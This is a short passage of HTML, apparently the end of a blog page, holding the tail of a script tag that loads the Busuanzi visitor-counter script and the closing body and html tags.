src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
